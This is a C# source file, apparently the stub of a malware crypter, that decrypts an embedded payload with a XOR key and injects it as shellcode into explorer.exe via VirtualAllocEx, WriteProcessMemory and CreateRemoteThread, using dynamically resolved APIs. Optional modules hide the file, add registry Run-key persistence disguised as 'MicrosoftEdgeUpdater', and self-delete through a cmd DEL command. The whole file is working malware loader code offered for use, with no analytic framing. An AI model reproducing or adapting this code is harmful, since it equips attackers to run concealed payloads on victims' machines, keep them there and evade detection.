using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.Win32;

#if UseAssembly
[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESC%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("%TRADEMARK%")]
[assembly: AssemblyVersion("%VERSION%")]
[assembly: AssemblyFileVersion("%FILE_VERSION%")]
#endif

namespace Tsushima
{
    #region Runtime - Main function call region
    internal class Runtime
    {
        static void Main(string[] args)
        {
            Thread.Sleep(6000);
            Release.Run(); // MAIN Method.
        }
    }
    #endregion

    #region Config
    public class Config
    {
        public static byte[] Payload = new byte[] { }; // Main payload array

        public static byte[] Key = new byte[] { }; // Key byte-array

        public static string ProcessName = "explorer"; // Default process name (can be overridden)

#if HideFile || MeltFile || Autorun
        public static string binaryLocate = Process.GetCurrentProcess().MainModule.FileName;
#endif
    }
#endregion

    #region Main functions call region
    public class Release
    {
        public static void Run()
        {
            try
            {
#if Autorun
                Autorun.Run();
#endif
#if HideFile
                HideFile.HideAssembly();
#endif
                byte[] payload = Decryptor.Run(Config.Payload, Config.Key);

                if (payload != null && payload.Length > 0)
                {
                    int processId = ProcessManager.GetOrStartProcess(Config.ProcessName);
                    if (processId > 0)
                    {
                        Loader.Execute(payload, processId);
                    }
                }
            }
            catch
            {
                Environment.FailFast(null);
            }
            finally
            {
#if MeltFile
                MeltFile.Melting();
#else
                Environment.Exit(0);
#endif
            }
        }
    }
#endregion

    #region Decryptor
    public class Decryptor
    {
        public static byte[] Run(byte[] payload, byte[] key)
        {
            byte[] decryptedBytes = new byte[payload.Length];

            for (int i = 0; i < payload.Length; i++)
            {
                decryptedBytes[i] = (byte)(payload[i] ^ key[i % key.Length]);
            }

            return decryptedBytes;
        }
    }
    #endregion

    #region Meta-Functions

#if MeltFile
    internal class MeltFile
    {
        public static void Melting()
        {
            var fileName = Config.binaryLocate;
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = "/c timeout /t 1 && DEL /f " + currentProcessFileName;
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
            Environment.Exit(0);
        }
    }
#endif

#if HideFile

    internal class HideFile
    {
        public static void HideAssembly()
        {
            string filePath = Config.binaryLocate;
            FileAttributes attributes = File.GetAttributes(filePath);

            if ((attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
            {
                File.SetAttributes(filePath, attributes | FileAttributes.Hidden);
            }
        }
    }
#endif

#if Autorun

    internal class Autorun
    {
        private const string RegistryPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        private const string AutorunName = "MicrosoftEdgeUpdater";

        public static void Run()
        {
            string currentLocation = Config.binaryLocate;

            string[] possiblePaths = {
                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                Path.GetTempPath(),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments)
            };

            Random random = new Random();
            string targetDirectory = possiblePaths[random.Next(possiblePaths.Length)];

            string targetPath = Path.Combine(targetDirectory, Path.GetFileName(currentLocation));

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegistryPath, writable: true))
                {
                    if (key.GetValue(AutorunName) == null)
                    {
                        key.SetValue(AutorunName, targetPath);
                        File.Copy(currentLocation, targetPath);
                    }
                }
            }
            catch
            {
                return;
            }
        }
    }

#endif

    #endregion

    #region Loader
    public class Loader
    {
        [System.Runtime.InteropServices.DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA(string name);

        [System.Runtime.InteropServices.DllImport("kernel32", CharSet = System.Runtime.InteropServices.CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, string name);

        internal static CreateApi Load<CreateApi>(string name, string method)
        {
            IntPtr hLibrary = LoadLibraryA(name);
            if (hLibrary == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            IntPtr procAddress = GetProcAddress(hLibrary, method);
            if (procAddress == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            return (CreateApi)(object)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(procAddress, typeof(CreateApi));
        }

        internal delegate IntPtr DelegateOpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);
        internal delegate IntPtr DelegateVirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
        internal delegate bool DelegateWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, IntPtr nSize, out UInt32 lpNumberOfBytesWritten);
        internal delegate bool DelegateVirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
        internal delegate IntPtr DelegateCreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);
        internal delegate bool DelegateCloseHandle(IntPtr hObject);

        internal static readonly DelegateOpenProcess OpenProcess = Load<DelegateOpenProcess>("kernel32", "OpenProcess");
        internal static readonly DelegateVirtualAllocEx VirtualAllocEx = Load<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");
        internal static readonly DelegateWriteProcessMemory WriteProcessMemory = Load<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");
        internal static readonly DelegateVirtualProtectEx VirtualProtectEx = Load<DelegateVirtualProtectEx>("kernel32", "VirtualProtectEx");
        internal static readonly DelegateCreateRemoteThread CreateRemoteThread = Load<DelegateCreateRemoteThread>("kernel32", "CreateRemoteThread");
        internal static readonly DelegateCloseHandle CloseHandle = Load<DelegateCloseHandle>("kernel32", "CloseHandle");

        private static readonly UInt32 PROCESS_ALL_ACCESS = 0x001F0FFF;
        private static readonly UInt32 MEM_COMMIT = 0x1000;
        private static readonly UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        internal static void Execute(byte[] shellcode, int processID)
        {
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (UInt32)processID);
            if (hProcess == IntPtr.Zero)
            {
                return;
            }

            IntPtr virtualAlloc = VirtualAllocEx(hProcess, IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (virtualAlloc == IntPtr.Zero)
            {
                return;
            }

            UInt32 bytesWritten;
            if (!WriteProcessMemory(hProcess, virtualAlloc, shellcode, (IntPtr)shellcode.Length, out bytesWritten))
            {
                return;
            }

            CreateRemoteThread(hProcess, IntPtr.Zero, 0, virtualAlloc, IntPtr.Zero, 0, IntPtr.Zero);
            CloseHandle(hProcess);
        }
    }

    #endregion

    #region ProcessManager
    public static class ProcessManager
    {
        public static int GetOrStartProcess(string processPathOrName)
        {
            if (processPathOrName.Contains("\\") || processPathOrName.Contains("/"))
            {
                var processByPath = Process.GetProcesses().FirstOrDefault(p => p.MainModule != null && p.MainModule.FileName == processPathOrName);
                if (processByPath != null)
                {
                    return processByPath.Id;
                }

                try
                {
                    var newProcess = Process.Start(processPathOrName);
                    if (newProcess != null)
                    {
                        return newProcess.Id;
                    }
                    else
                    {
                        return -1;
                    }
                }
                catch
                {
                    return -1;
                }
            }
            else
            {
                var processByName = Process.GetProcessesByName(processPathOrName).FirstOrDefault();
                if (processByName != null)
                {
                    return processByName.Id;
                }

                try
                {
                    var startInfo = new ProcessStartInfo(processPathOrName)
                    {
                        UseShellExecute = true
                    };
                    var newProcess = Process.Start(startInfo);
                    if (newProcess != null)
                    {
                        return newProcess.Id;
                    }
                    else
                    {
                        return -1;
                    }
                }
                catch
                {
                    return -1;
                }
            }
        }
    }

    #endregion
}
